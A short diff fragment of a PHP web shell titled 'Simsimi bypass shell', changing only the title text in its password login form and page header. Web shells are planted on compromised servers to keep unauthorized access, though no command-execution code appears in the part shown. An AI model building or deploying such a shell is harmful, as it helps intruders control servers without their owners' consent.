@@ -38,7 +38,7 @@ function displayPasswordForm() {
         }
     </style>
     <form method="post">
-        <h2>Simsimi bypass shell Login</h2>
+        <h2>Simsimi bypass shelll Login</h2>
         <input type="password" name="password" placeholder="Password"><br><br>
         <input type="submit" value="Login">
     </form>';
@@ -113,7 +113,7 @@ function displayPageContent() {
         }
     </style>';
 
-    echo "<h2>[ Simsimi bypass shell ]</h2>";
+    echo "<h2>[ Simsimi bypass shelll ]</h2>";
     echo "<div class='path'>Current Path: ";
     $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
     $currentPath = '';
